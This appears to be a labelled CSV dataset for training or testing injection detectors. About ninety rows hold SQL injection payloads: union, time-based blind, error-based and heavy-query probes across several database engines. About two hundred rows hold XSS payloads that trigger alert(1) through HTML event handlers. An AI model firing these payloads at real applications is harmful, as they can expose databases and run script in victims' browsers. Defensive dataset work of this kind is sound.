index,payload,sqli,xss
6064,"1%' union all select null,null,null,null,null,null--",1,0
6065,"-4072%""   )    )     )   or 3999  =  1979",1,0
6066,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",1,0
6067,"1"" and sleep  (  5  )  #",1,0
6068,"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""kpwc"" like ""kpwc",1,0
6069,"-4728""   )    )    as ndri where 3278  =  3278 or make_set  (  9354  =  9354,7185  )  --",1,0
6070,"1""  )   as obbk where 6414  =  6414 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0
6071,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",1,0
6072,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,0
6073,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",1,0
6074,-3105' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'srep'  =  'srep,1,0
6075,-4339  )   where 7178  =  7178 or 4008  =  7232,1,0
6076,"1""   )    )    as irrz where 8730  =  8730 order by 1#",1,0
6077,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",1,0
6078,"1""  )   as cysq where 5258  =  5258",1,0
6079,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",1,0
6080,"-4639""   )    )     )   or 8550  =  9348",1,0
6081,"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",1,0
6082,1  )   as fhvr where 5544  =  5544,1,0
6083,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,0
6084,select case when 1238  =  9044 then 1 else null end--,1,0
6085,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",1,0
6086,"1,  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1,0
6087,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1,0
6088,1   )    )    and 9198  =  9198--,1,0
6089,1' in boolean mode  )   waitfor delay '0:0:5'--,1,0
6090,"1%""   )    )     )   union all select null,null,null,null,null#",1,0
6091,"-8888%'  )   union all select 5312,5312,5312,5312,5312,5312,5312,5312--",1,0
6092,"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0
6093,-7230'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'khtc'  =  'khtc,1,0
6094,"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""dnlz""  =  ""dnlz",1,0
6095, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,1,0
6096,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,0
6097,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,0
6098,select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #,1,0
6099,1   )    )    as ogcv where 4396  =  4396,1,0
6100,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",1,0
6101,"1  )   as ocut where 6800  =  6800 and elt  (  4249  =  4249,7259  )  --",1,0
6102,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'mizk'  =  'mizk,1,0
6103,"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""ffcf"" like ""ffcf",1,0
6104,"-1490'||  (  select 'uzbm' from dual where 3181  =  3181 union all select 3181,3181,3181,3181,3181--",1,0
6105,"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#",1,0
6106,1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,0
6107,"1""  )   as vqkz where 8536  =  8536",1,0
6108,-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1,0
6109,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",1,0
6110,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",1,0
6111,"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,0
6112,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,1,0
6113,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0
6114,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",1,0
6115,"-7544""   )    )    union all select 3808,3808,3808,3808--",1,0
6116,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",1,0
6117,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,1,0
6118,"1 where 5859  =  5859 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0
6119,"1""  )   where 2445  =  2445",1,0
6120,end and 'icny' like 'icny,1,0
6121,1 where 4940  =  4940,1,0
6122,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",1,0
6123,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat",1,0
6124,"1%""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1,0
6125,1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,1,0
6126,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,0
6127,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1,0
6128,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat",1,0
6129,"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv",1,0
6130,"1 union all select null,null,null,null,null,null,null,null,null,null#",1,0
6131,select   (  case when   (  5914  =  2314  )   then 5914 else 1/  (  select 0  )   end  )  --,1,0
6132,"1""  )   union all select null,null--",1,0
6133,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",1,0
6134,"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0
6135,"1'  )   union all select null,null--",1,0
6136,1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,1,0
6137,-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,1,0
6138,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1,0
6139,1'  )   where 8118  =  8118,1,0
6140,"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0
6141,"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0
6142,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,0
6143,"iif  (  9007  =  3836,1,1/0  )  ",1,0
6144,"select * from generate_series  (  7237,7237,case when   (  7237  =  9757  )   then 1 else 0 end  )   limit 1--",1,0
6145,1'  )   where 1369  =  1369 and 4840  =  1697#,1,0
6146,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,1,0
6147,1 where 4245  =  4245,1,0
6148,1   )    )    as xlww where 5844  =  5844,1,0
6149,select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0
6150,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,0
6151,"1%""  )   order by 1--",1,0
6152,"1 union all select null,null,null,null,null,null,null,null,null#",1,0
6153,"1""  )   where 8953  =  8953 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
6154,"1' in boolean mode  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1,0
6155,"-1737' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fsmd'  =  'fsmd",1,0
6156,"1'+  (  select lang where 4191  =  4191 union all select null,null#",1,0
6157,<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,0,1
6158,"<isindex onbeforecopy=""alert(1)"" contenteditable>test</isindex>",0,1
6159,"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",0,1
6160,"<isindex onbeforepaste=""alert(1)"" contenteditable>test</isindex>",0,1
6161,<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>,0,1
6162,"<isindex onclick=""alert(1)"">test</isindex>",0,1
6163,"<isindex oncontextmenu=""alert(1)"">test</isindex>",0,1
6164,"<isindex oncopy=""alert(1)"" contenteditable>test</isindex>",0,1
6165,"<isindex oncut=""alert(1)"" contenteditable>test</isindex>",0,1
6166,"<isindex ondblclick=""alert(1)"">test</isindex>",0,1
6167,<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,0,1
6168,"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",0,1
6169,"<isindex onkeypress=""alert(1)"" contenteditable>test</isindex>",0,1
6170,"<isindex onkeyup=""alert(1)"" contenteditable>test</isindex>",0,1
6171,"<isindex onmousedown=""alert(1)"">test</isindex>",0,1
6172,"<isindex onmouseenter=""alert(1)"">test</isindex>",0,1
6173,"<isindex onmouseleave=""alert(1)"">test</isindex>",0,1
6174,"<isindex onmousemove=""alert(1)"">test</isindex>",0,1
6175,"<isindex onmouseout=""alert(1)"">test</isindex>",0,1
6176,"<isindex onmouseover=""alert(1)"">test</isindex>",0,1
6177,"<isindex onmouseup=""alert(1)"">test</isindex>",0,1
6178,"<isindex onpaste=""alert(1)"" contenteditable>test</isindex>",0,1
6179,<isindex type=image onload=alert(1) src=validimage.png>,0,1
6180,<isindex type=image src=1 onerror=alert(1)>,0,1
6181,"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",0,1
6182,"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",0,1
6183,"<kbd draggable=""true"" ondragenter=""alert(1)"">test</kbd>",0,1
6184,"<kbd draggable=""true"" ondragleave=""alert(1)"">test</kbd>",0,1
6185,"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",0,1
6186,<kbd id=x tabindex=1 onactivate=alert(1)></kbd>,0,1
6187,<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>,0,1
6188,<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>,0,1
6189,<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,0,1
6190,<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,0,1
6191,<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,0,1
6192,"<kbd onbeforecopy=""alert(1)"" contenteditable>test</kbd>",0,1
6193,"<kbd onbeforecut=""alert(1)"" contenteditable>test</kbd>",0,1
6194,"<kbd onbeforepaste=""alert(1)"" contenteditable>test</kbd>",0,1
6195,<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>,0,1
6196,"<kbd onclick=""alert(1)"">test</kbd>",0,1
6197,"<kbd oncontextmenu=""alert(1)"">test</kbd>",0,1
6198,"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",0,1
6199,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",0,1
6200,"<kbd ondblclick=""alert(1)"">test</kbd>",0,1
6201,<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>,0,1
6202,"<kbd onkeydown=""alert(1)"" contenteditable>test</kbd>",0,1
6203,"<kbd onkeypress=""alert(1)"" contenteditable>test</kbd>",0,1
6204,"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",0,1
6205,"<kbd onmousedown=""alert(1)"">test</kbd>",0,1
6206,"<kbd onmouseenter=""alert(1)"">test</kbd>",0,1
6207,"<kbd onmouseleave=""alert(1)"">test</kbd>",0,1
6208,"<kbd onmousemove=""alert(1)"">test</kbd>",0,1
6209,"<kbd onmouseout=""alert(1)"">test</kbd>",0,1
6210,"<kbd onmouseover=""alert(1)"">test</kbd>",0,1
6211,"<kbd onmouseup=""alert(1)"">test</kbd>",0,1
6212,"<kbd onpaste=""alert(1)"" contenteditable>test</kbd>",0,1
6213,<keygen autofocus onfocus=alert(1)>,0,1
6214,<keygen autofocus onfocusin=alert(1)>,0,1
6215,"<keygen draggable=""true"" ondrag=""alert(1)"">test</keygen>",0,1
6216,"<keygen draggable=""true"" ondragend=""alert(1)"">test</keygen>",0,1
6217,"<keygen draggable=""true"" ondragenter=""alert(1)"">test</keygen>",0,1
6218,"<keygen draggable=""true"" ondragleave=""alert(1)"">test</keygen>",0,1
6219,"<keygen draggable=""true"" ondragstart=""alert(1)"">test</keygen>",0,1
6220,<keygen id=x onfocus=alert(1)>,0,1
6221,<keygen id=x onfocusin=alert(1)>,0,1
6222,<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,0,1
6223,<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>,0,1
6224,<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>,0,1
6225,<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>,0,1
6226,"<keygen onbeforecopy=""alert(1)"" contenteditable>test</keygen>",0,1
6227,"<keygen onbeforecut=""alert(1)"" contenteditable>test</keygen>",0,1
6228,"<keygen onbeforepaste=""alert(1)"" contenteditable>test</keygen>",0,1
6229,<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,0,1
6230,"<keygen onclick=""alert(1)"">test</keygen>",0,1
6231,"<keygen oncontextmenu=""alert(1)"">test</keygen>",0,1
6232,"<keygen oncopy=""alert(1)"" contenteditable>test</keygen>",0,1
6233,"<keygen oncut=""alert(1)"" contenteditable>test</keygen>",0,1
6234,"<keygen ondblclick=""alert(1)"">test</keygen>",0,1
6235,<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>,0,1
6236,"<keygen onkeydown=""alert(1)"" contenteditable>test</keygen>",0,1
6237,"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",0,1
6238,"<keygen onkeyup=""alert(1)"" contenteditable>test</keygen>",0,1
6239,"<keygen onmousedown=""alert(1)"">test</keygen>",0,1
6240,"<keygen onmouseenter=""alert(1)"">test</keygen>",0,1
6241,"<keygen onmouseleave=""alert(1)"">test</keygen>",0,1
6242,"<keygen onmousemove=""alert(1)"">test</keygen>",0,1
6243,"<keygen onmouseout=""alert(1)"">test</keygen>",0,1
6244,"<keygen onmouseover=""alert(1)"">test</keygen>",0,1
6245,"<keygen onmouseup=""alert(1)"">test</keygen>",0,1
6246,"<keygen onpaste=""alert(1)"" contenteditable>test</keygen>",0,1
6247,"<label draggable=""true"" ondrag=""alert(1)"">test</label>",0,1
6248,"<label draggable=""true"" ondragend=""alert(1)"">test</label>",0,1
6249,"<label draggable=""true"" ondragenter=""alert(1)"">test</label>",0,1
6250,"<label draggable=""true"" ondragleave=""alert(1)"">test</label>",0,1
6251,"<label draggable=""true"" ondragstart=""alert(1)"">test</label>",0,1
6252,<label id=x tabindex=1 onactivate=alert(1)></label>,0,1
6253,<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,0,1
6254,<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>,0,1
6255,<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,0,1
6256,<label id=x tabindex=1 onfocus=alert(1)></label>,0,1
6257,<label id=x tabindex=1 onfocusin=alert(1)></label>,0,1
6258,"<label onbeforecopy=""alert(1)"" contenteditable>test</label>",0,1
6259,"<label onbeforecut=""alert(1)"" contenteditable>test</label>",0,1
6260,"<label onbeforepaste=""alert(1)"" contenteditable>test</label>",0,1
6261,<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>,0,1
6262,"<label onclick=""alert(1)"">test</label>",0,1
6263,"<label oncontextmenu=""alert(1)"">test</label>",0,1
6264,"<label oncopy=""alert(1)"" contenteditable>test</label>",0,1
6265,"<label oncut=""alert(1)"" contenteditable>test</label>",0,1
6266,"<label ondblclick=""alert(1)"">test</label>",0,1
6267,<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>,0,1
6268,"<label onkeydown=""alert(1)"" contenteditable>test</label>",0,1
6269,"<label onkeypress=""alert(1)"" contenteditable>test</label>",0,1
6270,"<label onkeyup=""alert(1)"" contenteditable>test</label>",0,1
6271,"<label onmousedown=""alert(1)"">test</label>",0,1
6272,"<label onmouseenter=""alert(1)"">test</label>",0,1
6273,"<label onmouseleave=""alert(1)"">test</label>",0,1
6274,"<label onmousemove=""alert(1)"">test</label>",0,1
6275,"<label onmouseout=""alert(1)"">test</label>",0,1
6276,"<label onmouseover=""alert(1)"">test</label>",0,1
6277,"<label onmouseup=""alert(1)"">test</label>",0,1
6278,"<label onpaste=""alert(1)"" contenteditable>test</label>",0,1
6279,"<legend draggable=""true"" ondrag=""alert(1)"">test</legend>",0,1
6280,"<legend draggable=""true"" ondragend=""alert(1)"">test</legend>",0,1
6281,"<legend draggable=""true"" ondragenter=""alert(1)"">test</legend>",0,1
6282,"<legend draggable=""true"" ondragleave=""alert(1)"">test</legend>",0,1
6283,"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",0,1
6284,<legend id=x tabindex=1 onactivate=alert(1)></legend>,0,1
6285,<legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>,0,1
6286,<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>,0,1
6287,<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>,0,1
6288,<legend id=x tabindex=1 onfocus=alert(1)></legend>,0,1
6289,<legend id=x tabindex=1 onfocusin=alert(1)></legend>,0,1
6290,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",0,1
6291,"<legend onbeforecut=""alert(1)"" contenteditable>test</legend>",0,1
6292,"<legend onbeforepaste=""alert(1)"" contenteditable>test</legend>",0,1
6293,<legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>,0,1
6294,"<legend onclick=""alert(1)"">test</legend>",0,1
6295,"<legend oncontextmenu=""alert(1)"">test</legend>",0,1
6296,"<legend oncopy=""alert(1)"" contenteditable>test</legend>",0,1
6297,"<legend oncut=""alert(1)"" contenteditable>test</legend>",0,1
6298,"<legend ondblclick=""alert(1)"">test</legend>",0,1
6299,<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>,0,1
6300,"<legend onkeydown=""alert(1)"" contenteditable>test</legend>",0,1
6301,"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",0,1
6302,"<legend onkeyup=""alert(1)"" contenteditable>test</legend>",0,1
6303,"<legend onmousedown=""alert(1)"">test</legend>",0,1
6304,"<legend onmouseenter=""alert(1)"">test</legend>",0,1
6305,"<legend onmouseleave=""alert(1)"">test</legend>",0,1
6306,"<legend onmousemove=""alert(1)"">test</legend>",0,1
6307,"<legend onmouseout=""alert(1)"">test</legend>",0,1
6308,"<legend onmouseover=""alert(1)"">test</legend>",0,1
6309,"<legend onmouseup=""alert(1)"">test</legend>",0,1
6310,"<legend onpaste=""alert(1)"" contenteditable>test</legend>",0,1
6311,"<li draggable=""true"" ondrag=""alert(1)"">test</li>",0,1
6312,"<li draggable=""true"" ondragend=""alert(1)"">test</li>",0,1
6313,"<li draggable=""true"" ondragenter=""alert(1)"">test</li>",0,1
6314,"<li draggable=""true"" ondragleave=""alert(1)"">test</li>",0,1
6315,"<li draggable=""true"" ondragstart=""alert(1)"">test</li>",0,1
6316,<li id=x tabindex=1 onactivate=alert(1)></li>,0,1
6317,<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,0,1
6318,<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,0,1
6319,<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>,0,1
6320,<li id=x tabindex=1 onfocus=alert(1)></li>,0,1
6321,<li id=x tabindex=1 onfocusin=alert(1)></li>,0,1
6322,"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",0,1
6323,"<li onbeforecut=""alert(1)"" contenteditable>test</li>",0,1
6324,"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",0,1
6325,<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,0,1
6326,"<li onclick=""alert(1)"">test</li>",0,1
6327,"<li oncontextmenu=""alert(1)"">test</li>",0,1
6328,"<li oncopy=""alert(1)"" contenteditable>test</li>",0,1
6329,"<li oncut=""alert(1)"" contenteditable>test</li>",0,1
6330,"<li ondblclick=""alert(1)"">test</li>",0,1
6331,<li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>,0,1
6332,"<li onkeydown=""alert(1)"" contenteditable>test</li>",0,1
6333,"<li onkeypress=""alert(1)"" contenteditable>test</li>",0,1
6334,"<li onkeyup=""alert(1)"" contenteditable>test</li>",0,1
6335,"<li onmousedown=""alert(1)"">test</li>",0,1
6336,"<li onmouseenter=""alert(1)"">test</li>",0,1
6337,"<li onmouseleave=""alert(1)"">test</li>",0,1
6338,"<li onmousemove=""alert(1)"">test</li>",0,1
6339,"<li onmouseout=""alert(1)"">test</li>",0,1
6340,"<li onmouseover=""alert(1)"">test</li>",0,1
6341,"<li onmouseup=""alert(1)"">test</li>",0,1
6342,"<li onpaste=""alert(1)"" contenteditable>test</li>",0,1
6343,"<link draggable=""true"" ondrag=""alert(1)"">test</link>",0,1
6344,"<link draggable=""true"" ondragend=""alert(1)"">test</link>",0,1
6345,"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",0,1
6346,"<link draggable=""true"" ondragleave=""alert(1)"">test</link>",0,1
6347,"<link draggable=""true"" ondragstart=""alert(1)"">test</link>",0,1
6348,<link href=validstyles.css rel=stylesheet onload=alert(1)>,0,1
6349,<link id=x tabindex=1 onactivate=alert(1)></link>,0,1
6350,<link id=x tabindex=1 onbeforeactivate=alert(1)></link>,0,1
6351,<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>,0,1
6352,<link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>,0,1
6353,"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",0,1
6354,"<link onbeforecut=""alert(1)"" contenteditable>test</link>",0,1
6355,"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",0,1
6356,<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,0,1
6357,"<link onclick=""alert(1)"">test</link>",0,1
6358,"<link oncontextmenu=""alert(1)"">test</link>",0,1
6359,"<link oncopy=""alert(1)"" contenteditable>test</link>",0,1
6360,"<link oncut=""alert(1)"" contenteditable>test</link>",0,1
6361,"<link ondblclick=""alert(1)"">test</link>",0,1
6362,<link onfocus=alert(1) id=x tabindex=1 style=display:block>,0,1
